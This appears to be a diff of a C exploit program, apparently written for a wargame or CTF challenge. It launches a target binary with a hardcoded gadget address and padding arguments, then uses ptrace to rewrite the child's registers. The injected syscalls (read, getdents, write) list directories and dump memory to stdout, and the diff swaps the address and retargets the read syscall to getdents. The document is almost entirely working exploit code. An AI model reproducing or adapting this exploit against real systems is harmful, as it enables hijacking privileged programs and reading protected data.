@@ -11,7 +11,7 @@
 //author : afang
 //comment: what a nice day, isn't it?!
 
-unsigned int syscall_addr = 0x2aa6ffe7;
+unsigned int syscall_addr = 0x55591c97;
 
 int main(int argc, char *argv[]){
 
@@ -29,7 +29,7 @@ int main(int argc, char *argv[]){
 			return;
 		} */
 		char *envp[] = {NULL};
-		execl(filename, "\xe7\xff\xa6\x2a", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A",  NULL, envp);
+		execl(filename, "\x97\x1c\x59\x55", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A",  NULL, envp);
 	}else{
 		while(1){
 		wait(&wait_status);
@@ -59,7 +59,7 @@ int main(int argc, char *argv[]){
 			regs.eax = 0x3; //read syscall.
 			regs.ebx = 0;
 			regs.ecx = regs.esp;
-			regs.edx = 0x4;
+			regs.edx = 0x1f;
 
 			regs.eip = syscall_addr;
 			single = 1;
@@ -94,9 +94,9 @@ int main(int argc, char *argv[]){
 
 			//Set new args.
 			regs.ebx = regs.eax;
-			regs.eax = 0x3; //read syscall.
+			regs.eax = 0x8d; //getdents syscall.
 			regs.ecx = regs.esp;
-			regs.edx = 0x50;
+			regs.edx = 0x100;
 			regs.eip = syscall_addr;
 			ptrace(PTRACE_SETREGS, child_pid, NULL, &regs);
 		}
@@ -106,8 +106,8 @@ int main(int argc, char *argv[]){
 			//Set new args.
 			regs.eax = 0x4; //write syscall.
 			regs.ebx = 0x1;
-			regs.ecx = regs.esp;
-			regs.edx = 0x50;
+			regs.ecx = regs.esp + 0xa;
+			regs.edx = 0x100;
 			regs.eip = syscall_addr;
 			ptrace(PTRACE_SETREGS, child_pid, NULL, &regs);
 		}
